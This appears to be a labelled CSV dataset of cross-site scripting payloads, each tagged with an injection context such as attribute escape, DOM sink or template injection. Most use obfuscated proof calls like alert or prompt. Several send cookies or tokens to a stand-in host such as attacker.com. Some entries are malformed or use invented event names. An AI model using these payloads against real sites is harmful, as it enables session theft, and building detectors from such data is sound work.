payload,context
&quOt; onAuxCliCk=AleRt(1) X=&QuoT;,attribute_escape
[#alert document.cookie /],template_injection
""" ><svG oNtoGglE=pRomPt(1)>",attribute_escape
"LocAtiOn.HreF=""JavAscRipT:fEtcH(1)""",dom_sink
"__proto__[%22ongotpointercapture%22]=console.log(String.fromCharCode(88,83,83))",dom_sink
"Object.assign(window,{%22onpause%22:prompt})",dom_sink
<form onwebkittransitionend=prompt(location.hash) onwebkittransitionend=prompt(location.hash)>,tag_injection
"onpointermove=prompt&#40;String.fromCharCode(88,83,83)&#41;",event_handler
'><img src=x onr&#101;s&#101;t=consol&#101;.log('XSS')>,attribute_escape
{{ ConFirM(dOcuMenT.cOokIe) }},template_injection
%3Ctable	onmozfullscreenchange=confirm(1)%3E,tag_injection
eval(%22XMLHttpRequest(document.domain)%22),dom_sink
'><Img srC=x onMouSeuP=pRomPt(DocUmeNt.DomAin)>,attribute_escape
"setInterval(""\u0061lert(navigator.sendBeacon('//attacker.com',document.cookie))"",100)",dom_sink
"LocAtiOn=""jaVasCriPt:ConSolE.lOg(1)""",dom_sink
' onpromptaction=prompt(location.hash) ',attribute_escape
onanimationiteration=confirm/**/(%27XSS%27),event_handler
`><img src=x onpagehide=prompt(document.domain)>,attribute_escape
"""><img src=x onw&#97;iting=confirm(docum&#101;nt.dom&#97;in)>",attribute_escape
"Object.assign(window,{""onend"":console.log})",dom_sink
%3Ctr/ontouchstart=confirm(location.hash)%3E,tag_injection
\' OngEstUreStaRt=AleRt(1)//,attribute_escape
	ontr&#97;nsition&#101;nd=&#97;l&#101;rt(loc&#97;tion.h&#97;sh),event_handler
%22 ><svg onsearch=confirm(1)>,attribute_escape
"location.href=""javascript:XMLHttpRequest(btoa(document.cookie))""",dom_sink
"loc&#97;tion=""j&#97;v&#97;script:f&#101;tch(1)""",dom_sink
"__pRotO__[""oNfuLlsCreEncHanGe""]=fEtcH(dOcuMenT.cOokIe+'&lOc='+lOcaTioN.hRef)",dom_sink
"Object.assign(window,{%22onerror%22:prompt})",dom_sink
 ondr&#97;g&#101;nt&#101;r=prompt(docum&#101;nt.dom&#97;in),event_handler
"document.body.innerHTML=""<img src=x onerror=confirm(document.domain)>""",dom_sink
"__proto__[""onmozfullscreenchange""]=\u0061lert('//attacker.com/?c='+document.cookie)",dom_sink
'%3E%3Cimg src=x ontransitionend=alert(1)%3E,attribute_escape
"""%3E%3Cdetails onrepeat=prompt(1)%3E",tag_injection
\' OnhAshChaNge=alErt('XSS')//,attribute_escape
%22><body onpointermove=alert(location.hash)>,tag_injection
	onSubMit=coNfiRm(1),event_handler
`><Img srC=x onBefOrePasTe=ProMpt(1)>,attribute_escape
"location=""javascr	ipt:eval(document.cookie+'&loc='+location.href)""",dom_sink
"ObjEct.asSigN(wIndOw,{""oNmoUseEntEr"":XMLHtTpREquEst})",dom_sink
'><Img srC=x onTouCheNd=ConFirM('XSS')>,attribute_escape
""" %3E%3Csvg onpointermove=prompt(location.hash)%3E",attribute_escape
""" ontoggl&#101;=consol&#101;.log(1) """,attribute_escape
<video src=x ondragstart=alert('XSS')>,tag_injection
onblur=javascript:console.log(document.domain),event_handler
%3C!--%3E%3Cform onwebkitanimationend=prompt('XSS')%3E,tag_injection
' ontouchmove=console.log('XSS') ',attribute_escape
' onmouseup=console.log('XSS') ',attribute_escape
onb&#101;gin=consol&#101;.log('XSS'),event_handler
"<script>window['console.log'](String.fromCharCode(88,83,83))</script>",script_injection
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=confirm(docum&#101;nt.cooki&#101;)>""",dom_sink
"setTimeout(""alert(document.domain)"",0)",dom_sink
"`%3E%3Cimg src=x ongotpointercapture=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape
" onfocusout=prompt(String.fromCharCode(88,83,83))",event_handler
onr&#101;p&#101;&#97;t=&#97;l&#101;rt&#40;loc&#97;tion.h&#97;sh&#41;,event_handler
\%27 onscrollsnapchange=console.log(location.hash)//,attribute_escape
"""><select onanimationstart=prompt('XSS')>",tag_injection
onanimationiteration=prompt&#40;document.domain&#41;,event_handler
<plaintext onpagereveal=\u0061lert(location.hash) onpagereveal=\u0061lert(location.hash)>,tag_injection
"setTimeout(%22eval(%27//attacker.com/?c=%27+document.cookie)%22,0)",dom_sink
\' OndRop=coNfiRm(1)//,attribute_escape
'><img src=x onc&#97;npl&#97;y=prompt(docum&#101;nt.dom&#97;in)>,attribute_escape
%3Cscript%3Econsole.log(location.hash)%3C/script%3E,script_injection
<template/onended=prompt('XSS')>,tag_injection
<s&#101;l&#101;ct x=y onpromptdismiss=consol&#101;.log(1)>,tag_injection
"""><img src=x onhashchange=prompt('XSS')>",attribute_escape
onauxclick=javascript:console.log(%27XSS%27),event_handler
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=XMLHttpRequest(localStorage.getItem(%27token%27))>%22)",dom_sink
""" onclos&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh) """,attribute_escape
%27><img src=x onanimationcancel=prompt(location.hash)>,attribute_escape
'><img src=x onb&#101;for&#101;input=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape
"'><img src=x onb&#101;gin=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
<script>Function('console.log('XSS')')();</script>,script_injection
"' ><svg onanimationstart=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape
<script	>confirm(document.domain)</script>,script_injection
<!--><TitLe OncLicK=cOnfIrm('XSS')>,tag_injection
"\"" onprompt&#97;ction=confirm(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
"<title
onstalled=\u0061lert('XSS')>",tag_injection
onpagehide=confirm/*x*/(location.hash),event_handler
&quot; onw&#97;iting=confirm(docum&#101;nt.dom&#97;in) x=&quot;,attribute_escape
\%27 oncut=confirm(%27XSS%27)//,attribute_escape
%27 ><svg onwaiting=confirm(document.domain)>,attribute_escape
"""%3E%3Cimg src=x onfocusout=console.log(location.hash)%3E",attribute_escape
<!--><title onmozfullscreenchange=prompt('XSS')>,tag_injection
"LocAtiOn=""jaVasCriPt:ConFirM(lOcaLStOraGe.GetIteM('TokEn'))""",dom_sink
%3Cscript%3Econfirm`1`%3C/script%3E,script_injection
"data:text/html,%3Cscript%3Ealert(document.domain)%3C/script%3E",js_uri
<b&#97;s&#101; onpoint&#101;rup=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) onpoint&#101;rup=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
"&quOt; onTouChsTarT=aLerT(STriNg.FroMChArCOde(88,83,83)) X=&QuoT;",attribute_escape
&quot; on&#101;nd&#101;d=consol&#101;.log(docum&#101;nt.dom&#97;in) x=&quot;,attribute_escape
<!--><script onclick=prompt(%27XSS%27)>,tag_injection
"""><Img srC=x onBluR=cOnsOle.loG(dOcuMenT.dOmaIn)>",attribute_escape
onhashchange=javascript:\u0061lert(location.hash),event_handler
"<xmp/onfocusout=prompt(String.fromCharCode(88,83,83))>",tag_injection
"Object.assign(window,{""onpromptdismiss"":fetch})",dom_sink
<!--><&#97;nim&#97;t&#101;motion ondrop=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
<scRipT/oNpoIntErrAwuPdaTe=ConSolE.lOg(DocUmeNt.DomAin)>,tag_injection
%22 ><svg ontouchstart=prompt(document.domain)>,attribute_escape
"""><img src=x ondblclick=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"%27><img src=x onanimationstart=alert(String.fromCharCode(88,83,83))>",attribute_escape
' on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(docum&#101;nt.dom&#97;in) ',attribute_escape
"__pRotO__[""oNclIck""]=EvaL(lOcaTioN.hAsh)",dom_sink
' onblur=\u0061lert(location.hash) ',attribute_escape
'><scr	ipt>prompt(document.domain)</scr	ipt>,script_injection
	onPauSe=ConSolE.lOg(LocAtiOn.HasH),event_handler
"LocAtiOn.HreF=""JavAscRipT:cOnsOle.loG('//aTtaCkeR.cOm/?c='+dOcuMenT.cOokIe)""",dom_sink
"<script
>\u0061lert(1)</script>",script_injection
`><img src=x onbeforecopy=prompt(location.hash)>,attribute_escape
"WinDow[""cOnfIrm""]('//AttAckEr.Com/?c='+DocUmeNt.CooKie)",dom_sink
\' on&#97;nim&#97;tionc&#97;nc&#101;l=confirm(loc&#97;tion.h&#97;sh)//,attribute_escape
	onpointerup=\u0061lert(document.domain),event_handler
""" oNbeForEinPut=coNsoLe.Log('XSS') """,attribute_escape
'><img src=x ondragenter=console.log(1)>,attribute_escape
oncanplay=console.log(%27XSS%27),event_handler
"\"" onb&#101;gin=confirm(1)//",attribute_escape
'><img src=x onpromptdismiss=prompt(loc&#97;tion.h&#97;sh)>,attribute_escape
"<audio
onscrollend=prompt(location.hash)>",tag_injection
"""><img src=x oncut=console.log(1)>",attribute_escape
<teMplAte onSeaRch=coNsoLe.Log(doCumEnt.doMaiN)>,tag_injection
 ong&#101;stur&#101;&#101;nd=confirm('XSS'),event_handler
<liNk OniNpuT=aLerT(dOcuMenT.dOmaIn) onInpUt=AleRt(DocUmeNt.DomAin)>,tag_injection
"\"" OnaNimAtiOniTerAtiOn=ProMpt(1)//",attribute_escape
`><img src=x onreset=alert('XSS')>,attribute_escape
"document.write(""<img src=x onerror=eval(String.fromCharCode(88,83,83))>"")",dom_sink
"""><img src=x onreset=prompt(location.hash)>",attribute_escape
"location.href=""javascript:console.log(document.cookie)""",dom_sink
"\%27 ondragover=console.log(String.fromCharCode(88,83,83))//",attribute_escape
' ><svg onpointercancel=prompt(1)>,attribute_escape
<img onwebkitfullscreenchange=\u0061lert('XSS')>,tag_injection
' onh&#97;shch&#97;ng&#101;=prompt('XSS') ',attribute_escape
'%3E%3Cimg src=x ontouchstart=console.log(document.domain)%3E,attribute_escape
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=fEtcH('XSS')>""",dom_sink
	onk&#101;ypr&#101;ss=consol&#101;.log(1),event_handler
%3Cobject onvolumechange=alert(1) onvolumechange=alert(1)%3E,tag_injection
{{[].pOp.ConStrUctOr('prOmpT(dOcuMenT.cOokIe)')()}},template_injection
\' on&#101;nd&#101;d=&#97;l&#101;rt('XSS')//,attribute_escape
"""><Img srC=x onResEt=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
'%3E%3Cimg src=x onanimationiteration=prompt(1)%3E,attribute_escape
<t&#97;bl&#101;	oncopy=confirm('XSS')>,tag_injection
\%22 onpause=console.log(%27XSS%27)//,attribute_escape
"""%3E%3Cimg src=x ontoggle=alert(document.domain)%3E",attribute_escape
"""%3E%3Cimg src=x onreset=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape
"setInterval(%22prompt(document.cookie+%27&loc=%27+location.href)%22,100)",dom_sink
#{{AleRt(DocUmeNt.CooKie)}},template_injection
<iframe onsecuritypolicyviolation=confirm('XSS')>,tag_injection
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=aLerT(dOcuMenT.cOokIe+'&lOc='+lOcaTioN.hRef)>"")",dom_sink
{{[].pOp.ConStrUctOr('alErt(1)')()}},template_injection
' ><svg ondr&#97;gst&#97;rt=consol&#101;.log(loc&#97;tion.h&#97;sh)>,attribute_escape
JavAscRipT:%0acOnsOle.loG(dOcuMenT.dOmaIn),js_uri
"OnmOusEwhEel=prOmpT/**/(StrIng.frOmCHarCodE(88,83,83))",event_handler
ondr&#97;gov&#101;r=prompt(loc&#97;tion.h&#97;sh),event_handler
&quot; onwebkitfullscreenchange=\u0061lert('XSS') x=&quot;,attribute_escape
on&#101;nd=consol&#101;.log(1),event_handler
' ontransitionend=alert(document.domain) ',attribute_escape
 onclick=prompt('XSS'),event_handler
&quot; ongesturestart=prompt(%27XSS%27) x=&quot;,attribute_escape
%3C!--%3E%3Canimatemotion onanimationcancel=prompt(1)%3E,tag_injection
javascript:alert/*x*/(%27XSS%27),js_uri
"&#101;v&#97;l(""prompt(loc&#97;tion.h&#97;sh)"")",dom_sink
"EleMenT.iNseRtADjaCenTHTML(""beForEenD"",""<iMg Src=x OneRroR=XMLHTtpReqUesT('//aTtaCkeR.cOm/?c='+dOcuMenT.cOokIe)>"")",dom_sink
	onScrOllEnd=prOmpT(1),event_handler
	onpointerrawupdate=console.log(1),event_handler
&quot; ondr&#97;g&#101;nt&#101;r=consol&#101;.log(1) x=&quot;,attribute_escape
onstalled=javascript:prompt(1),event_handler
	onKeyPreSs=ProMpt(1),event_handler
window[%22console.log%22](1),dom_sink
OnbEfoRecOpy=jaVasCriPt:ConSolE.lOg('XSS'),event_handler
""" oNpoIntEroVer=coNsoLe.Log('XSS') """,attribute_escape
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""&#101;v&#97;l('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)"")",dom_sink
<select	onpromptdismiss=console.log(1)>,tag_injection
<!--><math ondragover=prompt(1)>,tag_injection
'><img src=x onh&#97;shch&#97;ng&#101;=prompt('XSS')>,attribute_escape
"\%22 onkeypress=console.log(String.fromCharCode(88,83,83))//",attribute_escape
"<scr	ipt>/*/console.log(String.fromCharCode(88,83,83))</scr	ipt>",script_injection
<seLecT x=y OnmOusEwhEel=alErt(doCumEnt.doMaiN)>,tag_injection
	onPlaY=cOnsOle.loG(1),event_handler
"""%3E%3Canimatemotion onanimationiteration=console.log('XSS')%3E",tag_injection
""" ongestureend=confirm(location.hash) """,attribute_escape
<template onended=prompt(%27XSS%27)/>,tag_injection
"<marquee/onbeforetoggle=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection
%3Ctextarea	onscrollend=alert('XSS')%3E,tag_injection
"__proto__[%22ontoggle%22]=XMLHttpRequest(navigator.sendBeacon(%27//attacker.com%27,document.cookie))",dom_sink
\%27 onanimationiteration=console.log(1)//,attribute_escape
&quot; onsearch=\u0061lert(1) x=&quot;,attribute_escape
"__proto__[%22onsearch%22]=eval(String.fromCharCode(88,83,83))",dom_sink
"'%3E%3Cscript%3Econsole.log(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
<a	onmozfullscreenchange=alert(location.hash)>,tag_injection
' %3E%3Csvg onauxclick=confirm(location.hash)%3E,attribute_escape
\' ontouchmove=confirm('XSS')//,attribute_escape
&quot; onpageswap=alert(document.domain) x=&quot;,attribute_escape
'><Img srC=x onCopY=cOnsOle.loG(lOcaTioN.hAsh)>,attribute_escape
"&#101;v&#97;l(""consol&#101;.log(docum&#101;nt.dom&#97;in)"")",dom_sink
	onpoint&#101;rup=prompt(loc&#97;tion.h&#97;sh),event_handler
onpagehide=prompt/***/(document.domain),event_handler
"ObjEct.asSigN(wIndOw,{""oNblUr"":prOmpT})",dom_sink
<%= &#97;l&#101;rt docum&#101;nt.dom&#97;in %>,template_injection
<marquee/onauxclick=prompt(location.hash)>,tag_injection
"%22><img src=x onended=alert(String.fromCharCode(88,83,83))>",attribute_escape
%22 onbeforecut=console.log(1) %22,attribute_escape
JAVASCRIPT:alert('XSS'),js_uri
"window[""console.log""]('XSS')",dom_sink
""" %3E%3Csvg onerror=alert(1)%3E",attribute_escape
JavAscRipT:vOid(alErt(loCatIon.haSh)),js_uri
(new Function(%22console.log(document.cookie+%27&loc=%27+location.href)%22))();,dom_sink
\%22 onbeforepaste=console.log(%27XSS%27)//,attribute_escape
"\"" onstalled=prompt(1)//",attribute_escape
"j&#97;v&#97;
script:&#97;l&#101;rt(1)",js_uri
<script>/*/confirm(%27XSS%27)</script>,script_injection
<auDio/onPlaY=cOnsOle.loG(1)>,tag_injection
`><img src=x onk&#101;ypr&#101;ss=&#97;l&#101;rt(1)>,attribute_escape
onbeforetoggle=\u0061lert/**/(location.hash),event_handler
<script>\u0061lert`'XSS'`</script>,script_injection
"onhashchange=confirm(String.fromCharCode(88,83,83))",event_handler
"\' onbeforetoggle=\u0061lert(String.fromCharCode(88,83,83))//",attribute_escape
<seT sRc=X oNfoCus=prOmpT(dOcuMenT.dOmaIn)>,tag_injection
 ondragover=prompt('XSS'),event_handler
onchange=javascript:confirm(location.hash),event_handler
\' OntOucHmoVe=ConSolE.lOg('XSS')//,attribute_escape
"onkeydown=javascr	ipt:alert(String.fromCharCode(88,83,83))",event_handler
onh&#97;shch&#97;ng&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh),event_handler
"""%3E%3Cmarquee onclose=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
__proto__[%22onpromptaction%22]=console.log(document.domain),dom_sink
"""><Img srC=x onTouChsTarT=cOnsOle.loG(dOcuMenT.dOmaIn)>",attribute_escape
%22 ongestureend=prompt(document.domain) %22,attribute_escape
"Object.assign(window,{%22oncut%22:prompt})",dom_sink
<liStiNg OnpOinTerRawUpdAte=alErt('XSS') oNpoIntErrAwuPdaTe=AleRt('XSS')>,tag_injection
"onmozfullscreenchange=prompt/***/(String.fromCharCode(88,83,83))",event_handler
"%27><img src=x onload=alert(String.fromCharCode(88,83,83))>",attribute_escape
<!--><img onpageswap=console.log(1)>,tag_injection
%3Ctable onselect=prompt(1) onselect=prompt(1)%3E,tag_injection
<anImaTemOtiOn/OngEstUreStaRt=ConFirM(1)>,tag_injection
<script>confirm(location.hash)</script>,script_injection
#s&#101;t($x='prompt('XSS')')$x,template_injection
"<form
onsearch=console.log(1)>",tag_injection
\' ondr&#97;gst&#97;rt=confirm(1)//,attribute_escape
&quot; onpromptaction=console.log('XSS') x=&quot;,attribute_escape
oncanplay=javascr	ipt:console.log('XSS'),event_handler
`><img src=x onscrollsnapchange=console.log(1)>,attribute_escape
<!--><button ondr&#97;g&#101;nt&#101;r=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
""" ><svg ongotpointercapture=confirm(String.fromCharCode(88,83,83))>",attribute_escape
"eval(""alert(1)"")",dom_sink
"<script>setTimeout('console.log(location.hash)',0)</script>",script_injection
\%22 onload=console.log(1)//,attribute_escape
<scr	ipt	>alert(location.hash)</scr	ipt>,script_injection
javascript:prompt/***/(document.domain),js_uri
	ons&#101;curitypolicyviol&#97;tion=consol&#101;.log(docum&#101;nt.dom&#97;in),event_handler
oncanplay=javascript:console.log('XSS'),event_handler
"SetTimEouT(""FetCh(DocUmeNt.DomAin)"",0)",dom_sink
' onpointerrawupdate=\u0061lert('XSS') ',attribute_escape
"%27 onanimationiteration=alert(String.fromCharCode(88,83,83)) %27",attribute_escape
"<scRipT
oNkeYdoWn=ConFirM(dOcuMenT.dOmaIn)>",tag_injection
<noScrIpt onGesTurEstArt=alErt('XSS')/>,tag_injection
%22 onmouseover=prompt(1) %22,attribute_escape
' oNtoGglE=cOnsOle.loG(1) ',attribute_escape
\' ongestureend=confirm(location.hash)//,attribute_escape
"<scRipT
>ProMpt(1)</sCriPt>",script_injection
\' onend=confirm('XSS')//,attribute_escape
onanimationend=prompt(1),event_handler
'><Img srC=x onFulLscReeNchAngE=aLerT(lOcaTioN.hAsh)>,attribute_escape
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=confirm(docum&#101;nt.dom&#97;in)>""",dom_sink
<source/oninput=alert(location.hash)>,tag_injection
'><Img srC=x onBegIn=ConSolE.lOg(LocAtiOn.HasH)>,attribute_escape
"window[""prompt""]('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)",dom_sink
`><Img srC=x onDroP=pRomPt('XSS')>,attribute_escape
"Object.assign(window,{%22onpointermove%22:fetch})",dom_sink
{{$on.constructor('confirm(document.cookie)')()}},template_injection
%22><td onmozfullscreenchange=console.log(location.hash)>,tag_injection
OnpAgeShoW=jAvaScrIpt:prOmpT(1),event_handler
' oNmoUseOveR=pRomPt(DocUmeNt.DomAin) ',attribute_escape
onr&#101;p&#101;&#97;t=&#97;l&#101;rt&#40;'XSS'&#41;,event_handler
&quOt; onPagEreVeaL=cOnfIrm(doCumEnt.doMaiN) X=&QuoT;,attribute_escape
